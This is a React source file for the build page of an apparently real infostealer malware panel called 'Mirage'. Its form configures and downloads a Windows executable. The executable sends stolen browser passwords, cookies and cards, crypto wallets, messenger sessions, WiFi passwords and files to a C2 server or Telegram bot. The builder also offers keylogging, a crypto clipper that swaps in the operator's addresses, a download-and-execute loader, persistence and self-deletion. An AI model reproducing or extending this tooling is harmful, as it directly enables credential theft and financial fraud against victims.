import { useState } from 'react'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import { api } from '@/lib/api'
import { t } from '@/lib/i18n'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table'
import { Skeleton } from '@/components/ui/skeleton'
import { Hammer, Download, Loader2, ChevronDown } from 'lucide-react'
import type { BuildConfig, BuildRecord, BuildResponse } from '@/types'

const defaultConfig: BuildConfig = {
  build_name: '', build_tag: '',
  c2_host: '127.0.0.1', c2_port: 8443, c2_token: '',
  telegram_token: '', telegram_chat_id: '',
  anti_duplicate: { ban_hwid: false, ban_ip: false, ban_timeout_h: 0 },
  proxy_gate: { enabled: false, type: 'github', source_id: '' },
  modules: {
    chromium: { enabled: true, passwords: true, cookies: true, cards: true, history: false, autofill: false, bookmarks: false, google_tokens: false, cdp_grab: false, raw_export: false, kill_browsers: false },
    firefox: { enabled: false, passwords: false, cookies: false, history: false },
    wallets: true, gaming: false, vpn: false, twofa: false, passman: false,
    messengers: { discord: true, telegram: true, telegram_clients: [], signal: false, whatsapp: false, skype: false, viber: false, element: false, session: false, tox: false, icq: false, pidgin: false, outlook: false },
    system: { system_info: true, wifi: true, screenshot: true, keylogger: false, seed_grabber: false, clipboard: false },
    clipper: { enabled: false, coins: [], btc_addr: '', eth_addr: '', trx_addr: '', xmr_addr: '', sol_addr: '', ton_addr: '' },
    grabber: { enabled: false, extensions: [], max_size_mb: 10, max_depth: 3, paths: [] },
    loader: { enabled: false, url: '' },
  },
  persistence: false, self_delete: false, startup_delay_ms: 0,
  socks5_host: '', socks5_port: 0,
  include_decryptor: true,
}

function Checkbox({ id, label, checked, onChange }: { id: string; label: string; checked: boolean; onChange: (v: boolean) => void }) {
  return <label htmlFor={id} className="flex items-center gap-2 text-sm cursor-pointer select-none"><input id={id} type="checkbox" checked={checked} onChange={e => onChange(e.target.checked)} className="rounded border-input" />{label}</label>
}

function Section({ title, defaultOpen, children }: { title: string; defaultOpen?: boolean; children: React.ReactNode }) {
  return <details open={defaultOpen} className="border rounded-lg p-3 group"><summary className="flex items-center gap-2 cursor-pointer select-none text-sm font-medium"><ChevronDown className="h-4 w-4 transition-transform group-open:rotate-180" />{title}</summary><div className="mt-3 space-y-2">{children}</div></details>
}

export default function BuildPage() {
  const queryClient = useQueryClient()
  const [config, setConfig] = useState<BuildConfig>({ ...defaultConfig })
  const [iconFile, setIconFile] = useState<File | null>(null)
  const m = config.modules
  const setM = (fn: (m: typeof config.modules) => typeof config.modules) => setConfig(c => ({ ...c, modules: fn(c.modules) }))

  const buildsQuery = useQuery({ queryKey: ['builds'], queryFn: () => api.get<BuildRecord[]>('/api/build') })
  const buildMutation = useMutation({
    mutationFn: async () => {
      let iconArr: number[] | undefined
      if (iconFile) { const buf = await iconFile.arrayBuffer(); iconArr = Array.from(new Uint8Array(buf)) }
      return api.post<BuildResponse>('/api/build', { ...config, icon_data: iconArr || config.icon_data })
    },
    onSuccess: () => queryClient.invalidateQueries({ queryKey: ['builds'] }),
  })

  const handleSubmit = (e: React.FormEvent) => { e.preventDefault(); buildMutation.mutate() }
  const handleDownload = async (buildId: string) => {
    try {
      const token = localStorage.getItem('token')
      const res = await fetch('/api/build/' + buildId + '/download', { headers: token ? { Authorization: 'Bearer ' + token } : {} })
      if (!res.ok) throw new Error('download failed')
      const blob = await res.blob(); const url = URL.createObjectURL(blob)
      const a = document.createElement('a'); a.href = url; a.download = 'mirage_' + buildId.slice(0, 8) + '.exe'; a.click()
      URL.revokeObjectURL(url)
    } catch (err) { console.error('Build download failed:', err) }
  }

  return (<div className="space-y-6">
    <h1 className="text-2xl font-semibold tracking-tight">{t('build.title')}</h1>
    <Card><CardHeader><CardTitle className="text-sm font-medium">{t('build.config')}</CardTitle></CardHeader><CardContent><form onSubmit={handleSubmit} className="space-y-6">
      <Section title="Basic Settings" defaultOpen>
        <div className="grid gap-4 md:grid-cols-2">
          <div className="space-y-2"><Label htmlFor="build_name">Build Name</Label><Input id="build_name" value={config.build_name} onChange={e => setConfig(c => ({ ...c, build_name: e.target.value }))} required /></div>
          <div className="space-y-2"><Label htmlFor="build_tag">{t('build.tag')}</Label><Input id="build_tag" placeholder="my_first_build" value={config.build_tag} onChange={e => setConfig(c => ({ ...c, build_tag: e.target.value }))} /></div>
          <div className="space-y-2"><Label htmlFor="c2_host">{t('build.c2_host')}</Label><Input id="c2_host" value={config.c2_host} onChange={e => setConfig(c => ({ ...c, c2_host: e.target.value }))} required /></div>
          <div className="space-y-2"><Label htmlFor="c2_port">{t('build.c2_port')}</Label><Input id="c2_port" type="number" min={1} max={65535} value={config.c2_port} onChange={e => setConfig(c => ({ ...c, c2_port: parseInt(e.target.value) || 8443 }))} /></div>
          <div className="space-y-2"><Label htmlFor="c2_token">C2 Token</Label><Input id="c2_token" value={config.c2_token} onChange={e => setConfig(c => ({ ...c, c2_token: e.target.value }))} /></div>
          <div className="space-y-2"><Label htmlFor="tg_token">{t('build.tg_token')}</Label><Input id="tg_token" value={config.telegram_token} onChange={e => setConfig(c => ({ ...c, telegram_token: e.target.value }))} /></div>
          <div className="space-y-2"><Label htmlFor="tg_chat">{t('build.tg_chat')}</Label><Input id="tg_chat" value={config.telegram_chat_id} onChange={e => setConfig(c => ({ ...c, telegram_chat_id: e.target.value }))} /></div>
        </div>
      </Section>

      <Section title="Modules" defaultOpen>
        <div className="space-y-3">
          <Section title="Chromium Browsers">
            <Checkbox id="cr_enabled" label="Enable Chromium" checked={m.chromium.enabled} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, enabled: v } }))} />
            {m.chromium.enabled && <div className="ml-6 grid gap-2 sm:grid-cols-2">
              <Checkbox id="cr_pw" label="Passwords" checked={m.chromium.passwords} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, passwords: v } }))} />
              <Checkbox id="cr_ck" label="Cookies" checked={m.chromium.cookies} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, cookies: v } }))} />
              <Checkbox id="cr_cd" label="Cards" checked={m.chromium.cards} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, cards: v } }))} />
              <Checkbox id="cr_hi" label="History" checked={m.chromium.history} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, history: v } }))} />
              <Checkbox id="cr_af" label="Autofill" checked={m.chromium.autofill} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, autofill: v } }))} />
              <Checkbox id="cr_bm" label="Bookmarks" checked={m.chromium.bookmarks} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, bookmarks: v } }))} />
              <Checkbox id="cr_gt" label="Google Tokens" checked={m.chromium.google_tokens} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, google_tokens: v } }))} />
              <Checkbox id="cr_cdp" label="CDP Grab" checked={m.chromium.cdp_grab} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, cdp_grab: v } }))} />
              <Checkbox id="cr_re" label="Raw Export" checked={m.chromium.raw_export} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, raw_export: v } }))} />
              <Checkbox id="cr_kb" label="Kill Browsers" checked={m.chromium.kill_browsers} onChange={v => setM(mm => ({ ...mm, chromium: { ...mm.chromium, kill_browsers: v } }))} />
            </div>}
          </Section>
          <Section title="Firefox">
            <Checkbox id="ff_enabled" label="Enable Firefox" checked={m.firefox.enabled} onChange={v => setM(mm => ({ ...mm, firefox: { ...mm.firefox, enabled: v } }))} />
            {m.firefox.enabled && <div className="ml-6 grid gap-2 sm:grid-cols-2">
              <Checkbox id="ff_pw" label="Passwords" checked={m.firefox.passwords} onChange={v => setM(mm => ({ ...mm, firefox: { ...mm.firefox, passwords: v } }))} />
              <Checkbox id="ff_ck" label="Cookies" checked={m.firefox.cookies} onChange={v => setM(mm => ({ ...mm, firefox: { ...mm.firefox, cookies: v } }))} />
              <Checkbox id="ff_hi" label="History" checked={m.firefox.history} onChange={v => setM(mm => ({ ...mm, firefox: { ...mm.firefox, history: v } }))} />
            </div>}
          </Section>
          <div className="flex flex-wrap gap-4 py-2">
            <Checkbox id="mod_wallets" label="Wallets" checked={m.wallets} onChange={v => setM(mm => ({ ...mm, wallets: v }))} />
            <Checkbox id="mod_gaming" label="Gaming" checked={m.gaming} onChange={v => setM(mm => ({ ...mm, gaming: v }))} />
            <Checkbox id="mod_vpn" label="VPN" checked={m.vpn} onChange={v => setM(mm => ({ ...mm, vpn: v }))} />
            <Checkbox id="mod_2fa" label="2FA" checked={m.twofa} onChange={v => setM(mm => ({ ...mm, twofa: v }))} />
            <Checkbox id="mod_pm" label="Password Managers" checked={m.passman} onChange={v => setM(mm => ({ ...mm, passman: v }))} />
          </div>
          <Section title="Messengers">
            <div className="grid gap-2 sm:grid-cols-2 md:grid-cols-3">
              {(['discord', 'telegram', 'signal', 'whatsapp', 'skype', 'viber', 'element', 'session', 'tox', 'icq', 'pidgin', 'outlook'] as const).map(name => (
                <Checkbox key={name} id={'msg_' + name} label={name.charAt(0).toUpperCase() + name.slice(1)} checked={m.messengers[name]} onChange={v => setM(mm => ({ ...mm, messengers: { ...mm.messengers, [name]: v } }))} />
              ))}
            </div>
            {m.messengers.telegram && <div className="ml-6 mt-2 space-y-2"><Label className="text-xs">Telegram clients:</Label><div className="flex flex-wrap gap-2">
              {['desktop', 'ayugram', '64gram', 'kotatogram', 'xgram'].map(client => {
                const active = m.messengers.telegram_clients.includes(client)
                return <label key={client} className={'text-xs px-2 py-0.5 rounded border cursor-pointer select-none ' + (active ? 'bg-primary/20 border-primary' : 'border-input')}>
                  <input type="checkbox" checked={active} className="sr-only" onChange={() => setM(mm => ({ ...mm, messengers: { ...mm.messengers, telegram_clients: active ? mm.messengers.telegram_clients.filter(c => c !== client) : [...mm.messengers.telegram_clients, client] } }))} />
                  {client}
                </label>
              })}
            </div></div>}
          </Section>
          <Section title="System">
            <div className="grid gap-2 sm:grid-cols-2">
              <Checkbox id="sys_si" label="System Info" checked={m.system.system_info} onChange={v => setM(mm => ({ ...mm, system: { ...mm.system, system_info: v } }))} />
              <Checkbox id="sys_wf" label="WiFi Passwords" checked={m.system.wifi} onChange={v => setM(mm => ({ ...mm, system: { ...mm.system, wifi: v } }))} />
              <Checkbox id="sys_ss" label={t('build.screenshot')} checked={m.system.screenshot} onChange={v => setM(mm => ({ ...mm, system: { ...mm.system, screenshot: v } }))} />
              <Checkbox id="sys_kl" label="Keylogger" checked={m.system.keylogger} onChange={v => setM(mm => ({ ...mm, system: { ...mm.system, keylogger: v } }))} />
              <Checkbox id="sys_sg" label="Seed Grabber" checked={m.system.seed_grabber} onChange={v => setM(mm => ({ ...mm, system: { ...mm.system, seed_grabber: v } }))} />
              <Checkbox id="sys_cb" label="Clipboard" checked={m.system.clipboard} onChange={v => setM(mm => ({ ...mm, system: { ...mm.system, clipboard: v } }))} />
            </div>
          </Section>
          <Section title="Clipper">
            <Checkbox id="clip_en" label="Enable Clipper" checked={m.clipper.enabled} onChange={v => setM(mm => ({ ...mm, clipper: { ...mm.clipper, enabled: v } }))} />
            {m.clipper.enabled && <div className="ml-6 space-y-3">
              <div className="flex flex-wrap gap-3">
                {(['btc', 'eth', 'trx', 'xmr', 'sol', 'ton'] as const).map(coin => {
                  const active = m.clipper.coins.includes(coin)
                  return <Checkbox key={coin} id={'coin_' + coin} label={coin.toUpperCase()} checked={active} onChange={() => setM(mm => ({ ...mm, clipper: { ...mm.clipper, coins: active ? mm.clipper.coins.filter(c => c !== coin) : [...mm.clipper.coins, coin] } }))} />
                })}
              </div>
              {m.clipper.coins.map(coin => <div key={coin} className="space-y-1">
                <Label htmlFor={'addr_' + coin} className="text-xs">{coin.toUpperCase()} Address</Label>
                <Input id={'addr_' + coin} className="font-mono text-xs" placeholder={'Your ' + coin.toUpperCase() + ' address'} value={(m.clipper as any)[coin + '_addr'] || ''} onChange={e => setM(mm => ({ ...mm, clipper: { ...mm.clipper, [coin + '_addr']: e.target.value } }))} />
              </div>)}
            </div>}
          </Section>
          <Section title="File Grabber">
            <Checkbox id="gr_en" label="Enable Grabber" checked={m.grabber.enabled} onChange={v => setM(mm => ({ ...mm, grabber: { ...mm.grabber, enabled: v } }))} />
            {m.grabber.enabled && <div className="ml-6 space-y-3">
              <div className="space-y-2"><Label htmlFor="gr_ext" className="text-xs">Extensions (comma-separated)</Label><Input id="gr_ext" placeholder=".txt,.doc,.pdf" value={m.grabber.extensions.join(',')} onChange={e => setM(mm => ({ ...mm, grabber: { ...mm.grabber, extensions: e.target.value.split(',').map(s => s.trim()).filter(Boolean) } }))} /></div>
              <div className="grid gap-2 sm:grid-cols-2">
                <div className="space-y-2"><Label htmlFor="gr_sz" className="text-xs">Max Size (MB)</Label><Input id="gr_sz" type="number" min={1} max={100} value={m.grabber.max_size_mb} onChange={e => setM(mm => ({ ...mm, grabber: { ...mm.grabber, max_size_mb: parseInt(e.target.value) || 10 } }))} /></div>
                <div className="space-y-2"><Label htmlFor="gr_dp" className="text-xs">Max Depth</Label><Input id="gr_dp" type="number" min={1} max={10} value={m.grabber.max_depth} onChange={e => setM(mm => ({ ...mm, grabber: { ...mm.grabber, max_depth: parseInt(e.target.value) || 3 } }))} /></div>
              </div>
            </div>}
          </Section>
          <Section title="Loader (Download + Execute)">
            <Checkbox id="ld_en" label="Enable Loader" checked={m.loader.enabled} onChange={v => setM(mm => ({ ...mm, loader: { ...mm.loader, enabled: v } }))} />
            {m.loader.enabled && <div className="ml-6 space-y-2"><Label htmlFor="ld_url" className="text-xs">Payload URL</Label><Input id="ld_url" placeholder="https://example.com/payload.exe" value={m.loader.url} onChange={e => setM(mm => ({ ...mm, loader: { ...mm.loader, url: e.target.value } }))} /></div>}
          </Section>
        </div>
      </Section>

      <Section title="Advanced"><div className="space-y-3">
        <div className="space-y-2"><Label className="text-sm font-medium">Anti-Duplicate</Label>
          <div className="flex flex-wrap gap-3">
            <Checkbox id="ad_hwid" label="Ban HWID" checked={config.anti_duplicate.ban_hwid} onChange={v => setConfig(c => ({ ...c, anti_duplicate: { ...c.anti_duplicate, ban_hwid: v } }))} />
            <Checkbox id="ad_ip" label="Ban IP" checked={config.anti_duplicate.ban_ip} onChange={v => setConfig(c => ({ ...c, anti_duplicate: { ...c.anti_duplicate, ban_ip: v } }))} />
          </div>
          <div className="space-y-2" style={{ maxWidth: 200 }}><Label htmlFor="ad_to" className="text-xs">Timeout (hours)</Label><Input id="ad_to" type="number" min={0} value={config.anti_duplicate.ban_timeout_h} onChange={e => setConfig(c => ({ ...c, anti_duplicate: { ...c.anti_duplicate, ban_timeout_h: parseInt(e.target.value) || 0 } }))} /></div>
        </div>
        <div className="space-y-2"><Label className="text-sm font-medium">Proxy Gate (C2 resolution)</Label>
          <Checkbox id="pg_en" label="Enable Proxy Gate" checked={config.proxy_gate.enabled} onChange={v => setConfig(c => ({ ...c, proxy_gate: { ...c.proxy_gate, enabled: v } }))} />
          {config.proxy_gate.enabled && <div className="ml-6 grid gap-2 sm:grid-cols-2">
            <div className="space-y-2"><Label htmlFor="pg_type" className="text-xs">Type</Label><select id="pg_type" className="w-full rounded-md border border-input bg-background px-3 py-2 text-sm" value={config.proxy_gate.type} onChange={e => setConfig(c => ({ ...c, proxy_gate: { ...c.proxy_gate, type: e.target.value } }))}><option value="github">GitHub</option><option value="telegram">Telegram</option><option value="ton">TON</option><option value="steam">Steam</option></select></div>
            <div className="space-y-2"><Label htmlFor="pg_sid" className="text-xs">Source ID (channel/repo)</Label><Input id="pg_sid" placeholder="mirage/c2" value={config.proxy_gate.source_id} onChange={e => setConfig(c => ({ ...c, proxy_gate: { ...c.proxy_gate, source_id: e.target.value } }))} /></div>
          </div>}
        </div>
        <div className="flex flex-wrap gap-4 py-2">
          <Checkbox id="cfg_persist" label={t('build.persistence')} checked={config.persistence} onChange={v => setConfig(c => ({ ...c, persistence: v }))} />
          <Checkbox id="cfg_sdel" label="Self-Delete" checked={config.self_delete} onChange={v => setConfig(c => ({ ...c, self_delete: v }))} />
          <Checkbox id="cfg_dec" label={t('build.decryptor')} checked={config.include_decryptor} onChange={v => setConfig(c => ({ ...c, include_decryptor: v }))} />
        </div>
        <div className="space-y-2" style={{ maxWidth: 200 }}><Label htmlFor="cfg_delay" className="text-xs">Startup Delay (ms)</Label><Input id="cfg_delay" type="number" min={0} value={config.startup_delay_ms} onChange={e => setConfig(c => ({ ...c, startup_delay_ms: parseInt(e.target.value) || 0 }))} /></div>
        <div className="grid gap-2 sm:grid-cols-2" style={{ maxWidth: 400 }}>
          <div className="space-y-2"><Label htmlFor="cfg_s5h" className="text-xs">SOCKS5 Host</Label><Input id="cfg_s5h" placeholder="127.0.0.1" value={config.socks5_host} onChange={e => setConfig(c => ({ ...c, socks5_host: e.target.value }))} /></div>
          <div className="space-y-2"><Label htmlFor="cfg_s5p" className="text-xs">SOCKS5 Port</Label><Input id="cfg_s5p" type="number" min={0} max={65535} value={config.socks5_port} onChange={e => setConfig(c => ({ ...c, socks5_port: parseInt(e.target.value) || 0 }))} /></div>
        </div>
        <div className="space-y-2"><Label htmlFor="icon_upload" className="text-xs">Custom Icon (.ico)</Label><Input id="icon_upload" type="file" accept=".ico" onChange={e => { const f = e.target.files?.[0]; if (f) setIconFile(f) }} /></div>
      </div></Section>

      <div className="flex items-center gap-4">
        <Button type="submit" disabled={buildMutation.isPending || !config.build_name.trim() || !config.c2_host.trim()}>
          {buildMutation.isPending ? <Loader2 className="h-4 w-4 animate-spin mr-2" /> : <Hammer className="h-4 w-4 mr-2" />}
          {buildMutation.isPending ? t('build.building') : t('build.build')}
        </Button>
        {buildMutation.data && <div className="rounded-md bg-success/10 p-3 text-sm text-success space-y-1"><p>Build complete</p><p className="text-xs font-mono">Size: {(buildMutation.data.file_size / 1024).toFixed(1)} KB</p><p className="text-xs font-mono">SHA256: {buildMutation.data.sha256}</p></div>}
        {buildMutation.error && <div className="rounded-md bg-destructive/10 p-3 text-sm text-destructive">Build failed: {(buildMutation.error as { message?: string })?.message || 'unknown error'}</div>}
      </div>
    </form></CardContent></Card>

    <Card><CardHeader><CardTitle className="text-sm font-medium">{t('build.history')}</CardTitle></CardHeader><CardContent><Table><TableHeader><TableRow><TableHead>Name</TableHead><TableHead>Tag</TableHead><TableHead>Size</TableHead><TableHead>SHA256</TableHead><TableHead>Created</TableHead><TableHead>Downloads</TableHead><TableHead /></TableRow></TableHeader><TableBody>
      {buildsQuery.isLoading && Array.from({ length: 3 }).map((_, i) => <TableRow key={i}><TableCell colSpan={7}><Skeleton className="h-8 w-full" /></TableCell></TableRow>)}
      {buildsQuery.data?.map(b => <TableRow key={b.id}>
        <TableCell className="font-medium text-xs">{b.build_tag?.split('_')[0] || '\u2014'}</TableCell>
        <TableCell className="font-mono text-xs">{b.build_tag || '\u2014'}</TableCell>
        <TableCell className="tabular-nums">{(b.file_size / 1024).toFixed(0)} KB</TableCell>
        <TableCell className="font-mono text-xs text-muted-foreground">{b.sha256?.slice(0, 12)}..</TableCell>
        <TableCell className="text-xs text-muted-foreground">{b.created_at?.slice(0, 10)}</TableCell>
        <TableCell className="tabular-nums">{b.download_count}</TableCell>
        <TableCell><Button variant="ghost" size="sm" onClick={() => handleDownload(b.id)}><Download className="h-4 w-4" /></Button></TableCell>
      </TableRow>)}
    </TableBody></Table></CardContent></Card>
  </div>)
}